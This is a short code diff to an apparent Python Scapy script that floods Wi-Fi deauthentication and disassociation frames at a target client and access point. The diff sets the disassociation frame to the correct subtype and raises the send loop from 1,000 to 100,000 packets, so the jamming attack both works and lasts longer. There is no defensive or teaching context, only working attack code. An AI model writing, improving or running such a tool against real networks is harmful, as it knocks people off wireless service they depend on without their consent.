@@ -15,7 +15,7 @@ def deauth_pkt(bssid, target):
 
 
 def disas_pkt(bssid, target):
-    return RadioTap()/Dot11(type=0, subtype=12, addr1=target,
+    return RadioTap()/Dot11(type=0, subtype=10, addr1=target,
                             addr2=bssid, addr3=bssid)/Dot11Disas(reason=6)
 
 
@@ -52,7 +52,7 @@ if __name__ == "__main__":
     print('\033[32m[+]\033[00m Starting now ...')
 
     try:
-        for i in range(1000):
+        for i in range(100000):
             sendp(packet, verbose=0, iface=iface)
             sys.stdout.write('\r[%s] %s' % (cyl[i % 4], upper(msg, i % len(msg))))
             sys.stdout.flush()        
